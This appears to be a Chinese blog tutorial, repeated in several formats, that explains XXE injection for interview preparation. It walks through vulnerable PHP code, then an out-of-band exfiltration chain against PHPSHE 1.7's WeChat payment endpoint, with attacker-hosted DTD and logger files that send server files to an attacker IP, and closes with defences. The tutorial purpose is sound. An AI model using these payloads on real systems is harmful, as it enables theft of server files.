前言\n\n刚刚进行了某公司渗透岗的面试，经历过多次面试的我发现，面试官很喜欢问XXE漏洞，而这也是很多人所不了解或者了解有限的，这里我希望通过一篇推文，让大家入门XXE漏洞，对于以后的面试甚至工作有所帮助。\n\n\n# XXE\nXML External Entity 即外部实体，从安全角度理解为XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，可以允许引入外部实体，攻击者通过伪造外部实体而触发漏洞。\n通俗点就是我们可以控制它解析我们传入的来自外部的实体而造成的漏洞。\n\n# XML外部实体注入攻击\n接下来我将对XML外部实体注入进行拆分解释：\n1.XML\n       可扩展标记语言（可以自己发明标签；在HTML中标签已经被预定义好了，可以直接使用）\n类似HTML\n设计宗旨为传输数据而非显示数据\n标签未定义\n自我描述性\nW3C标准\n（总结：XML就是用来存储传输数据的、可以自己发明标签）\n\n2.外部实体：外部的DTD（后面详细介绍什么是DTD部分）\n3.注入（所有注入都可以这样定义）：\n              1.用户能够控制输入\n              2.用户输入的数据被拼接到了原本要执行的代码一起执行\n\n#     标准的XXE攻击payload\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807027-8d35847c-5340-4ef7-8862-b5120c4ca214.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=816&status=done&style=none&width=415)\n       XML声明 - 类似PHP的<?php?>、用来声明此为XML\n       DTD – 可以理解为模板或规则，这里定义了一个标签foo以及通过file伪协议读取了/etc/passwd的内容\n       XML部分 调用了DTD部分定义的东西来执行，就如HTML中的标签，我们直接引用<h1>xxe</h1>表示将xxe作为1级标题加大&加粗字体。（只不过在XML中我们需要自己定义标签的含义）\n\n# 我是这样理解XXE漏洞的：\n1、 可以传参XML内容\n2、 XML内容会被放到代码中执行\n3、 传入恶意的DTD部分，使用SYSTEM与伪协议读取敏感信息或执行其他伪协议操作\n\n# 从代码层面出发理解XXE：\nPHP中存在一个函数：\nsimplexml_load_string('XML内容','SimpleXMLElement',LIBXML_NOENT)\n作用是将XML转化为对象\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807365-68cd40c2-5126-406d-a912-dc67650d2ace.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=1450&status=done&style=none&width=415)\n这里写段简单的代码看看效果：\n1、 在C盘放一个flag.txt文件，内容为this is good flag.\n2、 写一段PHP代码，通过simplexml_load_string解析XML内容，读取flag.txt的内容并输出\n附上代码，可以自己尝试，注意需要web环境，可以通过phpstudy快速搭建：\n<?php\n       $a = '<!DOCTYPE scan [<!ENTITY test SYSTEM \"file:///C:/flag.txt\">]><scan>&test;</scan>';\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?>\n\n是不是没什么感觉呢，那么我修改代码看看：\n<?php\n       @$a = file_get_contents(\"php://input\");\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?>\n这里可以看到原来的xml没了，变成了通过读取POST传输的数据，那么我们传参原来的payload，一样可以利用。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807673-117ec659-7045-43e0-b742-cd1d4b03ddf5.png#align=left&display=inline&height=164&margin=%5Bobject%20Object%5D&originHeight=494&originWidth=1247&status=done&style=none&width=415)\n# XXE无回显\n现在就要考虑另一个问题了，因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到，在上面的实验代码中可以通过删除最后的print($b)来实现这样的操作。XXE不回显问题当然也是有解决办法的，不知道大家接触过DNSLOG吗，可以通过咋域名前面放入查询出的内容，将数据通过dns日志记录下来。\nXXE虽然不是通过DNSlog，但是也同样是外带数据。\n流程如下：\n在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。\n具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上的。\n1.xml\n              <!ENTITY% all \"<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>\">%all;\n2.php\n              <?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?>\n3.txt\n       内容空\n\n# 实战演示：\n下面我将以PHPSHE1.7 cms来进行实战讲解\n1、 首先下载获取源码，在全局中搜索解析xml的函数simplexml_load_string，获取到2个php文件\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807995-b6b408a1-1c2c-42d7-8a3e-d06d5b6da135.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=687&originWidth=1641&status=done&style=none&width=415)\n2、 在include/function/global.func.php文件中可以看到，很熟悉的操作，通过php://input获取POST传参的内容，然后进行解析。（json_decode( )    ---- json 转 对象/数组）\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808483-5b780c7d-d926-44c6-981a-a02cc1ce5da5.png#align=left&display=inline&height=40&margin=%5Bobject%20Object%5D&originHeight=128&originWidth=1331&status=done&style=none&width=415)\n3、 这里因为是在函数pe_getxml中，所以还需要全局搜索看看哪些php文件调用了这个函数\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808778-ff3a23f4-6fa9-4caa-9c11-8cf42d7f3e2c.png#align=left&display=inline&height=59&margin=%5Bobject%20Object%5D&originHeight=135&originWidth=946&status=done&style=none&width=415)\n4、 第二个明显不是了，那就只能看第一个，点击查看代码\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809168-eeeba45c-8bbc-4061-9cd5-87a52e583ca2.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&originHeight=106&originWidth=788&status=done&style=none&width=415)\n5、 又在一个函数中，可以看到这个是接收微信xml数据的，那么我们再全局搜索wechat_getxml函数\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809522-3fdb9992-647f-4dd3-a4d8-513fec09f00b.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&originHeight=167&originWidth=1035&status=done&style=none&width=415)\n6、 可以定位到/include/plugin/payment/wechat/notify_url.php文件\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809899-7219a65d-c02c-4a35-ba44-cec786004556.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1126&status=done&style=none&width=415)\n7、 现在就已经发现了漏洞利用链，首先notify_url.php文件调用了wechat_getxml函数，wechat_getxml函数调用了pe_getxml函数，pe_getxml函数存在XXE漏洞，这里明显没有输出解析后的内容，即XXE无回显，所以我们还需要一台攻击机，在里面放上1.xml、2.php、3.txt\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810126-a505d447-4590-4ed6-87eb-1c00d48de8af.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&originHeight=231&originWidth=718&status=done&style=none&width=415)\n8、 内容如下：\n1.xml\n<!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://192.168.229.1/xxe/2.php?id=%file;'>\">%all;\n2.php\n<?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?>\n3.txt\n内容空\n9、 接下来搭建环境，通过phpstudy傻瓜式搭建phpshe网站\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810576-8dffa83a-e1a2-4f82-b199-643e379a0cab.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&originHeight=888&originWidth=1630&status=done&style=none&width=416)\n10、          访问存在漏洞的文件，确定文件是否存在，文件路径：/include/plugin/payment/wechat/notify_url.php\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810985-db91fa42-6f99-4248-a982-bccb78a1ddc3.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&originHeight=449&originWidth=1047&status=done&style=none&width=416)\n11、          可以看到，页面空白，说明确实存在这个页面。然后看看这次要获取的内容为服务器网站目录下的flag.txt文件，内容为This is my important data.。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317811565-6239b783-6629-4700-a217-a5245cfd7472.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1201&status=done&style=none&width=416)\n12、          接下来开始攻击，抓取该页面的数据包，修改传参方式为post，放上payload\npayload：\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW/flag.txt\">\n<!ENTITY % remote SYSTEM \"http://192.168.229.1/xxe/1.xml\">\n%remote;\n%send;\n]>\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812027-9555a8ec-3c57-4526-8d5a-9ff888bdb1b7.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=263&originWidth=896&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812280-8c2d2d56-24f7-453b-a597-2cbb522d57ce.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&originHeight=379&originWidth=1043&status=done&style=none&width=415)\n13、          放包，回去查看3.txt，发现已经有获取到内容了\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812577-94b84759-c4ae-48c6-b9cc-5104fe517397.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&originHeight=239&originWidth=674&status=done&style=none&width=404)\n14、          Base64解密，获取信息\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812955-ffd2d37e-56f8-4fa0-846c-75ffe1365e55.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=1350&status=done&style=none&width=416)\n# 防御方法：\n1.     使用开发语言提供的禁用外部实体的方法\nPHP：\nlibxml_disable_entity_loader(true);\n\nJAVA:\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n\nPython：\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n\n2.     过滤关键词：SYSTEM、PUBLIC等\n","slug":"一次面试引发的XXE学习","published":1,"updated":"2021-08-26T03:34:32.307Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpf8000kvkq31fqzf0cu","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>文章已发布到公众号：广软NSDA安全团队<br>标题：面试某公司渗透岗引发的XXE学习<br>链接：<a href=\"https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA\">https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA</a></p>\n</blockquote>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>刚刚进行了某公司渗透岗的面试，经历过多次面试的我发现，面试官很喜欢问XXE漏洞，而这也是很多人所不了解或者了解有限的，这里我希望通过一篇推文，让大家入门XXE漏洞，对于以后的面试甚至工作有所帮助。</p>\n<h1 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h1><p>XML External Entity 即外部实体，从安全角度理解为XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，可以允许引入外部实体，攻击者通过伪造外部实体而触发漏洞。<br>通俗点就是我们可以控制它解析我们传入的来自外部的实体而造成的漏洞。</p>\n<h1 id=\"XML外部实体注入攻击\"><a href=\"#XML外部实体注入攻击\" class=\"headerlink\" title=\"XML外部实体注入攻击\"></a>XML外部实体注入攻击</h1><p>接下来我将对XML外部实体注入进行拆分解释：<br>1.XML<br>       可扩展标记语言（可以自己发明标签；在HTML中标签已经被预定义好了，可以直接使用）<br>类似HTML<br>设计宗旨为传输数据而非显示数据<br>标签未定义<br>自我描述性<br>W3C标准<br>（总结：XML就是用来存储传输数据的、可以自己发明标签）</p>\n<p>2.外部实体：外部的DTD（后面详细介绍什么是DTD部分）<br>3.注入（所有注入都可以这样定义）：<br>              1.用户能够控制输入<br>              2.用户输入的数据被拼接到了原本要执行的代码一起执行</p>\n<h1 id=\"标准的XXE攻击payload\"><a href=\"#标准的XXE攻击payload\" class=\"headerlink\" title=\"标准的XXE攻击payload\"></a>标准的XXE攻击payload</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807027-8d35847c-5340-4ef7-8862-b5120c4ca214.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=816&status=done&style=none&width=415\"><br>       XML声明 - 类似PHP的<?php?>、用来声明此为XML<br>       DTD – 可以理解为模板或规则，这里定义了一个标签foo以及通过file伪协议读取了/etc/passwd的内容<br>       XML部分 调用了DTD部分定义的东西来执行，就如HTML中的标签，我们直接引用<h1>xxe</h1>表示将xxe作为1级标题加大&amp;加粗字体。（只不过在XML中我们需要自己定义标签的含义）</p>\n<h1 id=\"我是这样理解XXE漏洞的：\"><a href=\"#我是这样理解XXE漏洞的：\" class=\"headerlink\" title=\"我是这样理解XXE漏洞的：\"></a>我是这样理解XXE漏洞的：</h1><p>1、 可以传参XML内容<br>2、 XML内容会被放到代码中执行<br>3、 传入恶意的DTD部分，使用SYSTEM与伪协议读取敏感信息或执行其他伪协议操作</p>\n<h1 id=\"从代码层面出发理解XXE：\"><a href=\"#从代码层面出发理解XXE：\" class=\"headerlink\" title=\"从代码层面出发理解XXE：\"></a>从代码层面出发理解XXE：</h1><p>PHP中存在一个函数：<br>simplexml_load_string(‘XML内容’,’SimpleXMLElement’,LIBXML_NOENT)<br>作用是将XML转化为对象</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807365-68cd40c2-5126-406d-a912-dc67650d2ace.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=1450&status=done&style=none&width=415\"><br>这里写段简单的代码看看效果：<br>1、 在C盘放一个flag.txt文件，内容为this is good flag.<br>2、 写一段PHP代码，通过simplexml_load_string解析XML内容，读取flag.txt的内容并输出<br>附上代码，可以自己尝试，注意需要web环境，可以通过phpstudy快速搭建：<br><?php\n       $a = '<!DOCTYPE scan [<!ENTITY test SYSTEM \"file:///C:/flag.txt\">]><scan>&test;</scan>';\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?></p>\n<p>是不是没什么感觉呢，那么我修改代码看看：<br><?php\n       @$a = file_get_contents(\"php://input\");\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?><br>这里可以看到原来的xml没了，变成了通过读取POST传输的数据，那么我们传参原来的payload，一样可以利用。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807673-117ec659-7045-43e0-b742-cd1d4b03ddf5.png#align=left&display=inline&height=164&margin=%5Bobject%20Object%5D&originHeight=494&originWidth=1247&status=done&style=none&width=415\"></p>\n<h1 id=\"XXE无回显\"><a href=\"#XXE无回显\" class=\"headerlink\" title=\"XXE无回显\"></a>XXE无回显</h1><p>现在就要考虑另一个问题了，因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到，在上面的实验代码中可以通过删除最后的print($b)来实现这样的操作。XXE不回显问题当然也是有解决办法的，不知道大家接触过DNSLOG吗，可以通过咋域名前面放入查询出的内容，将数据通过dns日志记录下来。<br>XXE虽然不是通过DNSlog，但是也同样是外带数据。<br>流程如下：<br>在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。<br>具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上的。<br>1.xml<br>              &lt;!ENTITY% all “<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>“&gt;%all;<br>2.php<br>              <?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?><br>3.txt<br>       内容空</p>\n<h1 id=\"实战演示：\"><a href=\"#实战演示：\" class=\"headerlink\" title=\"实战演示：\"></a>实战演示：</h1><p>下面我将以PHPSHE1.7 cms来进行实战讲解<br>1、 首先下载获取源码，在全局中搜索解析xml的函数simplexml_load_string，获取到2个php文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807995-b6b408a1-1c2c-42d7-8a3e-d06d5b6da135.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=687&originWidth=1641&status=done&style=none&width=415\"><br>2、 在include/function/global.func.php文件中可以看到，很熟悉的操作，通过php://input获取POST传参的内容，然后进行解析。（json_decode( )    —- json 转 对象/数组）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808483-5b780c7d-d926-44c6-981a-a02cc1ce5da5.png#align=left&display=inline&height=40&margin=%5Bobject%20Object%5D&originHeight=128&originWidth=1331&status=done&style=none&width=415\"><br>3、 这里因为是在函数pe_getxml中，所以还需要全局搜索看看哪些php文件调用了这个函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808778-ff3a23f4-6fa9-4caa-9c11-8cf42d7f3e2c.png#align=left&display=inline&height=59&margin=%5Bobject%20Object%5D&originHeight=135&originWidth=946&status=done&style=none&width=415\"><br>4、 第二个明显不是了，那就只能看第一个，点击查看代码<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809168-eeeba45c-8bbc-4061-9cd5-87a52e583ca2.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&originHeight=106&originWidth=788&status=done&style=none&width=415\"><br>5、 又在一个函数中，可以看到这个是接收微信xml数据的，那么我们再全局搜索wechat_getxml函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809522-3fdb9992-647f-4dd3-a4d8-513fec09f00b.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&originHeight=167&originWidth=1035&status=done&style=none&width=415\"><br>6、 可以定位到/include/plugin/payment/wechat/notify_url.php文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809899-7219a65d-c02c-4a35-ba44-cec786004556.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1126&status=done&style=none&width=415\"><br>7、 现在就已经发现了漏洞利用链，首先notify_url.php文件调用了wechat_getxml函数，wechat_getxml函数调用了pe_getxml函数，pe_getxml函数存在XXE漏洞，这里明显没有输出解析后的内容，即XXE无回显，所以我们还需要一台攻击机，在里面放上1.xml、2.php、3.txt<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810126-a505d447-4590-4ed6-87eb-1c00d48de8af.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&originHeight=231&originWidth=718&status=done&style=none&width=415\"><br>8、 内容如下：<br>1.xml<br><!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://192.168.229.1/xxe/2.php?id=%file;'>“&gt;%all;<br>2.php<br><?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?><br>3.txt<br>内容空<br>9、 接下来搭建环境，通过phpstudy傻瓜式搭建phpshe网站<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810576-8dffa83a-e1a2-4f82-b199-643e379a0cab.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&originHeight=888&originWidth=1630&status=done&style=none&width=416\"><br>10、          访问存在漏洞的文件，确定文件是否存在，文件路径：/include/plugin/payment/wechat/notify_url.php<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810985-db91fa42-6f99-4248-a982-bccb78a1ddc3.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&originHeight=449&originWidth=1047&status=done&style=none&width=416\"><br>11、          可以看到，页面空白，说明确实存在这个页面。然后看看这次要获取的内容为服务器网站目录下的flag.txt文件，内容为This is my important data.。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317811565-6239b783-6629-4700-a217-a5245cfd7472.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1201&status=done&style=none&width=416\"><br>12、          接下来开始攻击，抓取该页面的数据包，修改传参方式为post，放上payload<br>payload：<br><?xml version=\"1.0\"?><br><!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW/flag.txt\"><br><!ENTITY % remote SYSTEM \"http://192.168.229.1/xxe/1.xml\"><br>%remote;<br>%send;<br>]&gt;<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812027-9555a8ec-3c57-4526-8d5a-9ff888bdb1b7.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=263&originWidth=896&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812280-8c2d2d56-24f7-453b-a597-2cbb522d57ce.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&originHeight=379&originWidth=1043&status=done&style=none&width=415\"><br>13、          放包，回去查看3.txt，发现已经有获取到内容了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812577-94b84759-c4ae-48c6-b9cc-5104fe517397.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&originHeight=239&originWidth=674&status=done&style=none&width=404\"><br>14、          Base64解密，获取信息<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812955-ffd2d37e-56f8-4fa0-846c-75ffe1365e55.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=1350&status=done&style=none&width=416\"></p>\n<h1 id=\"防御方法：\"><a href=\"#防御方法：\" class=\"headerlink\" title=\"防御方法：\"></a>防御方法：</h1><p>1.     使用开发语言提供的禁用外部实体的方法<br>PHP：<br>libxml_disable_entity_loader(true);</p>\n<p>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</p>\n<p>Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>\n<p>2.     过滤关键词：SYSTEM、PUBLIC等</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>文章已发布到公众号：广软NSDA安全团队<br>标题：面试某公司渗透岗引发的XXE学习<br>链接：<a href=\"https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA\">https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA</a></p>\n</blockquote>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>刚刚进行了某公司渗透岗的面试，经历过多次面试的我发现，面试官很喜欢问XXE漏洞，而这也是很多人所不了解或者了解有限的，这里我希望通过一篇推文，让大家入门XXE漏洞，对于以后的面试甚至工作有所帮助。</p>\n<h1 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h1><p>XML External Entity 即外部实体，从安全角度理解为XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，可以允许引入外部实体，攻击者通过伪造外部实体而触发漏洞。<br>通俗点就是我们可以控制它解析我们传入的来自外部的实体而造成的漏洞。</p>\n<h1 id=\"XML外部实体注入攻击\"><a href=\"#XML外部实体注入攻击\" class=\"headerlink\" title=\"XML外部实体注入攻击\"></a>XML外部实体注入攻击</h1><p>接下来我将对XML外部实体注入进行拆分解释：<br>1.XML<br>       可扩展标记语言（可以自己发明标签；在HTML中标签已经被预定义好了，可以直接使用）<br>类似HTML<br>设计宗旨为传输数据而非显示数据<br>标签未定义<br>自我描述性<br>W3C标准<br>（总结：XML就是用来存储传输数据的、可以自己发明标签）</p>\n<p>2.外部实体：外部的DTD（后面详细介绍什么是DTD部分）<br>3.注入（所有注入都可以这样定义）：<br>              1.用户能够控制输入<br>              2.用户输入的数据被拼接到了原本要执行的代码一起执行</p>\n<h1 id=\"标准的XXE攻击payload\"><a href=\"#标准的XXE攻击payload\" class=\"headerlink\" title=\"标准的XXE攻击payload\"></a>标准的XXE攻击payload</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807027-8d35847c-5340-4ef7-8862-b5120c4ca214.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=816&status=done&style=none&width=415\"><br>       XML声明 - 类似PHP的<?php?>、用来声明此为XML<br>       DTD – 可以理解为模板或规则，这里定义了一个标签foo以及通过file伪协议读取了/etc/passwd的内容<br>       XML部分 调用了DTD部分定义的东西来执行，就如HTML中的标签，我们直接引用<h1>xxe</h1>表示将xxe作为1级标题加大&amp;加粗字体。（只不过在XML中我们需要自己定义标签的含义）</p>\n<h1 id=\"我是这样理解XXE漏洞的：\"><a href=\"#我是这样理解XXE漏洞的：\" class=\"headerlink\" title=\"我是这样理解XXE漏洞的：\"></a>我是这样理解XXE漏洞的：</h1><p>1、 可以传参XML内容<br>2、 XML内容会被放到代码中执行<br>3、 传入恶意的DTD部分，使用SYSTEM与伪协议读取敏感信息或执行其他伪协议操作</p>\n<h1 id=\"从代码层面出发理解XXE：\"><a href=\"#从代码层面出发理解XXE：\" class=\"headerlink\" title=\"从代码层面出发理解XXE：\"></a>从代码层面出发理解XXE：</h1><p>PHP中存在一个函数：<br>simplexml_load_string(‘XML内容’,’SimpleXMLElement’,LIBXML_NOENT)<br>作用是将XML转化为对象</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807365-68cd40c2-5126-406d-a912-dc67650d2ace.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=1450&status=done&style=none&width=415\"><br>这里写段简单的代码看看效果：<br>1、 在C盘放一个flag.txt文件，内容为this is good flag.<br>2、 写一段PHP代码，通过simplexml_load_string解析XML内容，读取flag.txt的内容并输出<br>附上代码，可以自己尝试，注意需要web环境，可以通过phpstudy快速搭建：<br><?php\n       $a = '<!DOCTYPE scan [<!ENTITY test SYSTEM \"file:///C:/flag.txt\">]><scan>&test;</scan>';\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?></p>\n<p>是不是没什么感觉呢，那么我修改代码看看：<br><?php\n       @$a = file_get_contents(\"php://input\");\n       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);\n       print($b);\n       ?><br>这里可以看到原来的xml没了，变成了通过读取POST传输的数据，那么我们传参原来的payload，一样可以利用。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807673-117ec659-7045-43e0-b742-cd1d4b03ddf5.png#align=left&display=inline&height=164&margin=%5Bobject%20Object%5D&originHeight=494&originWidth=1247&status=done&style=none&width=415\"></p>\n<h1 id=\"XXE无回显\"><a href=\"#XXE无回显\" class=\"headerlink\" title=\"XXE无回显\"></a>XXE无回显</h1><p>现在就要考虑另一个问题了，因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到，在上面的实验代码中可以通过删除最后的print($b)来实现这样的操作。XXE不回显问题当然也是有解决办法的，不知道大家接触过DNSLOG吗，可以通过咋域名前面放入查询出的内容，将数据通过dns日志记录下来。<br>XXE虽然不是通过DNSlog，但是也同样是外带数据。<br>流程如下：<br>在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。<br>具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上的。<br>1.xml<br>              &lt;!ENTITY% all “<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>“&gt;%all;<br>2.php<br>              <?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?><br>3.txt<br>       内容空</p>\n<h1 id=\"实战演示：\"><a href=\"#实战演示：\" class=\"headerlink\" title=\"实战演示：\"></a>实战演示：</h1><p>下面我将以PHPSHE1.7 cms来进行实战讲解<br>1、 首先下载获取源码，在全局中搜索解析xml的函数simplexml_load_string，获取到2个php文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807995-b6b408a1-1c2c-42d7-8a3e-d06d5b6da135.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=687&originWidth=1641&status=done&style=none&width=415\"><br>2、 在include/function/global.func.php文件中可以看到，很熟悉的操作，通过php://input获取POST传参的内容，然后进行解析。（json_decode( )    —- json 转 对象/数组）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808483-5b780c7d-d926-44c6-981a-a02cc1ce5da5.png#align=left&display=inline&height=40&margin=%5Bobject%20Object%5D&originHeight=128&originWidth=1331&status=done&style=none&width=415\"><br>3、 